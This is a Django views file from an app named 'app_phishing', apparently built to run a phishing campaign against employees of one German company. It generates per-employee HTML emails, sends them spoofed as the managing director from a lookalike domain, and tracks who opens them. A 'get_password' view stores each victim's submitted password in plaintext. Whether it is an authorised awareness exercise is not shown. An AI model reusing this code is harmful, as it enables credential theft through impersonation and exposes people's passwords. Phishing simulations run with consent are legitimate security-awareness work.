import time
from datetime import datetime
from django.http import HttpResponse
from django.shortcuts import render, redirect, reverse
from django.contrib.sites.shortcuts import get_current_site
from django.contrib.auth.decorators import login_required

from django.core.mail import send_mail, send_mass_mail
from django.conf import settings
from django.contrib import messages
from smtplib import SMTPRecipientsRefused
from django.core.mail import EmailMessage
from django.core.mail import EmailMultiAlternatives
from django.template import Context
from django.template.loader import get_template
from django.http import HttpResponseRedirect, BadHeaderError

from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.utils.encoding import force_bytes, force_str, DjangoUnicodeDecodeError

from .models import User, UserMailTemplate
from .utils import generate_token
from django.contrib.auth import get_user_model


# Create your views here.
def index(request):
    return render(request, 'app_phishing/home.html')


@login_required
def employees(request):

    print(f" [datetime: {datetime.now()} ] ")
    users = User.objects.all().order_by('username').filter(user_offline=False)
    for user in users:
        create_email_template(request, user)

    return render(request, 'app_phishing/employees.html', context= {
        "users": users
    })


@login_required
def query_employees(request):

    if request.method == "GET":
        q = request.GET.get("q")

        users = User.objects.all()

        if q == "mail_send":
            users = User.objects.filter(usermailtemplate__is_active=True)

        elif q == "mail_open":
            users = User.objects.filter(is_active=True)

        elif q == "pwd_done":
            users = User.objects.exclude(pwd__isnull=True)
        else:
            print("d")

        return render(request, 'app_phishing/employees.html', context={
            "users": users
        })


@login_required
def search_status(request):
    if request.method == "POST":
        query = request.POST.get('search')
        users = User.objects.filter(full_name__icontains=query).filter(user_offline=False)

        return render(request, 'app_phishing/employees.html', context={
            "users": users
        })


@login_required
def show_template_from_db(request,  employee_id):
        employee = User.objects.get(pk=employee_id)
        user = UserMailTemplate.objects.filter(username=employee)[0]

        return HttpResponse(f"{user.email_template}")


def create_email_template(request, employee):

    current_site = get_current_site(request)

    user_email = UserMailTemplate.objects.filter(username=employee)

    if not user_email:

        email_template = get_template("app_phishing/email_template.html").render({
            # todo: user
            # 'toEmail': user.email,
            # todo user pbc user_email
            'toEmail': employee.user_email,
            'domain': current_site,
            'user': employee,
            'user_id': employee.id,
            'user_email': employee.user_email,
            'uid': urlsafe_base64_encode(force_bytes(employee.pk)),
            'token': generate_token.make_token(employee)
        })

        new_user = UserMailTemplate(username=employee, email_template=email_template)
        new_user.created_at = datetime.now()
        new_user.save()


def show_template_in_browser(request, uidb64, token):

    try:
        uid = force_str(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)

    except (Exception, TypeError, ValueError, OverflowError):
        user = None

    if user and generate_token.check_token(user, token):
        user = UserMailTemplate.objects.filter(username=user)[0]
        return HttpResponse(f"{user.email_template}")


def get_password(request, email='test@me.de', user_id=0):
    if request.method == "POST":
        pwd = request.POST.get('password')

        # todo: set leiter to pbcit-mitarbeiter
        user = get_user_model()
        employee = User.objects.get(pk=user_id)

        if employee:
            employee_mail_template = UserMailTemplate.objects.filter(username=employee).first()
            employee_mail_template.password = pwd
            employee_mail_template.save()

        if user or employee:
            user_username = user.objects.filter(email=email)
            employee.pwd = pwd
            employee.save()

        return HttpResponseRedirect(reverse('app_phishing:home'))

    return render(request,'app_phishing/get_password.html', context= {
        'user_email': email,
        'user_id': user_id
    })


def send_email_to_all(request):
    if request.method == 'POST':

        email_subject = "Einführung der neuen E-Mail-Vorlage für interne Anfragen"
        users = User.objects.all()
        email_for_user = UserMailTemplate.objects.all()
        for user in email_for_user:

            message = user.email_template
            # if not user.username.user_email:
            #     continue
            try:
                mail = EmailMessage(
                    subject=email_subject,
                    body=message,
                    from_email="Thomas Kahn | Geschäftsführug | PB Consult GmbH <thomas.kahn@pbconsult.info>" ,# "thomas.kahn@pbconsult.de",
                    to=[user.user_email],
                    reply_to=["thomas.kahn@pbconsult.info"],
                    headers={'From': 'Thomas Kahn | Geschäftsführug | PB Consult GmbH | Teams <thomas.kahn@pbconsult.info>'},
                )
                mail.content_subtype = "html"

                # todo: send mail to all
                # mail.send()

                user.is_active = True
                user.email_sent_at = datetime.now()
                user.save()

            except BadHeaderError:
                messages.error(request, f"Die Nachricht an {user.username} konnte nicht gesendet werden. Bitte versuche es noch einmal.")
                return HttpResponse('Invalid header found.')

            except SMTPRecipientsRefused:
                messages.error(request, f"Die Nachricht an {user.username} konnte nicht gesendet werden. Bitte versuche es noch einmal.")
                return HttpResponse('Invalid header found.')

            messages.success(request,
                             f"Die Nachricht an {user.username} wurde versendet.")
        return HttpResponseRedirect(reverse('app_phishing:employees'))


def send_email_to_user(request, employee_id):

    if request.method == "POST":
        user = User.objects.get(pk=employee_id)
        if user:
            user_template = UserMailTemplate.objects.filter(username=user).first()
            email_subject = "Einführung der neuen E-Mail-Vorlage für interne Anfragen"
            message = user_template.email_template

            # todo: einkommentieren
            try:
                mail = EmailMessage(
                    subject=email_subject,
                    body=message,
                    from_email="Thomas Kahn | Geschäftsführug | PB Consult GmbH <thomas.kahn@pbconsult.info>",
                    # bcc=[],# "thomas.kahn@pbconsult.de",
                    to=[user.user_email],
                    reply_to=["thomas.kahn@pbconsult.de"],

                    headers={
                        'From': 'Thomas Kahn | Geschäftsführug | PB Consult GmbH | Teams <thomas.kahn@  pbconsult.info>'},
                )
                mail.content_subtype = "html"

                #  todo: send the mail
                mail.send()

                # save email is sent
                user_template.is_active = True
                user_template.email_sent_at = datetime.now()
                user_template.save()

            except BadHeaderError:
                messages.error(request, f"Die Nachricht an {user.username} konnte nicht gesendet werden. Bitte versuche es noch einmal.")

                return HttpResponse('Invalid header found.')

            except SMTPRecipientsRefused:
                messages.error(request, f"Die Nachricht an {user.username} konnte nicht gesendet werden. Bitte versuche es noch einmal.")
                return HttpResponse('Invalid header found.')

            messages.success(request, f"Die Nachricht an {user.username} wurde versendet.")

        return HttpResponseRedirect(reverse('app_phishing:employees'))


def activate_user(request, uidb64, token):
    try:
        uid = force_str(urlsafe_base64_decode(uidb64))
        # todo: delete me es ist nur zum testen
        # user = get_user_model().objects.get(pk=uid)

        # Todo: es ist später für alle mitarbeiter
        user = User.objects.get(pk=uid)

    except (Exception, TypeError, ValueError, OverflowError):
        user = None

    if user and generate_token.check_token(user, token):
        user.is_active = True
        user.open_email = datetime.now()
        user.save()

        # send mail Email verified, you can now login
                                                # TODO: Spaeter pbc mitarbeiter user_email
                                                # todo: django user have email
        return redirect(reverse('app_phishing:get_pwd', args=(user.user_email, user.id, )))

    return HttpResponse('Activation link is invalid!')



## todo: deprecated

def send_mass_mail_to_all(request):

    if request.method == "POST":
        email_subject = "Einführung der neuen E-Mail-Vorlage für interne Anfragen"
        users = User.objects.all()
        email_for_user = UserMailTemplate.objects.all()
        mail_messages = ()

        emails = []
        # for user in emails:
        #
        #     message = "user.email_template"
        #     # if not user.username.user_email:
        #     #     continue
        #
        #     mail = EmailMessage(
        #         subject=email_subject,
        #         body=message,
        #         from_email="Thomas Kahn | Geschäftsführug | PB Consult GmbH <thomas.kahn@pbconsult.info>",
        #         # "thomas.kahn@pbconsult.de",
        #         to=[user],
        #         reply_to=["thomas.kahn@pbconsult.info"],
        #         headers={
        #             'From': 'Thomas Kahn | Geschäftsführug | PB Consult GmbH | Teams <thomas.kahn@pbconsult.info>'},
        #     )
        #     mail.content_subtype = "html"
        #
        #     email_template = get_template("app_phishing/email_template.html").render({
        #         # todo: user
        #         # 'toEmail': user.email,
        #         # todo user pbc user_email
        #         'toEmail': "test me",
        #         'domain': "test",
        #         'user': "employee",
        #         'user_email': "employee",
        #         'uid': 254185,
        #         'token': "fasdf"
        #     })
        #
        #
        #     # mail_messages = mail_messages + ((
        #     #                                      email_subject,
        #     #                                      email_template,
        #     #                                      "Thomas Kahn | Geschäftsführug | PB Consult GmbH <thomas.kahn@pbconsult.info>",
        #     #                                      [user],
        #     #                                  ), )
        #
        # try:
        #     # send_mass_mail(mail_messages, fail_silently=False)
        #
        #     # email_template = get_template("app_phishing/email_template.html").render({
        #     #     # todo: user
        #     #     # 'toEmail': user.email,
        #     #     # todo user pbc user_email
        #     #     'toEmail': "test me",
        #     #     'domain': "test",
        #     #     'user': "employee",
        #     #     'user_email': "employee",
        #     #     'uid': 254185,
        #     #     'token': "fasdf"
        #     # })
        #     #
        #     # subject, from_email, to = "hello", "thomas.kahn@pbconsult.info", "asan.chavdarliev@pbconsult.de"
        #     # text_content = "This is an important message."
        #     # html_content = "<p>This is an <strong>important</strong> message.</p>"
        #     # msg = EmailMultiAlternatives(subject, text_content, from_email, [to])
        #     # msg.attach_alternative(email_template, "text/html")
        #     # msg.send()
        #
        # except BadHeaderError:
        #     messages.error(request, f"Die Nachricht konnte nicht gesendet werden. Bitte versuche es noch einmal.")
        #
        #     return HttpResponse('Invalid header found.')
        #
        # except SMTPRecipientsRefused:
        #     messages.error(request, f"Die Nachricht konnte nicht gesendet werden. Bitte versuche es noch einmal.")
        # messages.success(request, f"Die Nachricht wurde versendet.")
        #
        # return HttpResponseRedirect(reverse('app_phishing:send_mass_mail'))

        emails = [
            'sn1001rmc@gmail.com',
            'asan.chavdarliev@pbconsult.de',
            'asan.chavdarliev@gmail.com',
            'achavdarliev@gmail.com',
        ]
        for user in emails:

            email_template = get_template("app_phishing/email_template.html").render({
                # todo: user
                # 'toEmail': user.email,
                # todo user pbc user_email
                'toEmail': "test me",
                'domain': "test",
                'user': "employee",
                'user_email': "employee",
                'uid': 254185,
                'token': "fasdf"
            })




            try:
                mail = EmailMessage(
                    subject=email_subject,
                    body=email_template,
                    from_email="Thomas Kahn | Geschäftsführug | PB Consult GmbH <thomas.kahn@pbconsult.info>" ,# "thomas.kahn@pbconsult.de",
                    to=[user],
                    reply_to=["thomas.kahn@pbconsult.info"],
                    headers={'From': 'Thomas Kahn | Geschäftsführug | PB Consult GmbH | Teams <thomas.kahn@pbconsult.info>'},
                )
                mail.content_subtype = "html"

                # todo: send mail to all
                mail.send()
                time.sleep(1)

            except BadHeaderError:
                messages.error(request, f"Die Nachricht konnte nicht gesendet werden. Bitte versuche es noch einmal.")
                return HttpResponse('Invalid header found.')

            except SMTPRecipientsRefused:
                messages.error(request, f"Die Nachricht konnte nicht gesendet werden. Bitte versuche es noch einmal.")
                return HttpResponse('Invalid header found.')

            messages.success(request,
                             f"Die Nachricht wurde versendet.")
        return HttpResponseRedirect(reverse('app_phishing:send_mass_mail'))

    messages.error(request, f"Keine Nachrichten konnten gesendet werden")

    return render(request, "app_phishing/dev_test_mass_mailing.html")

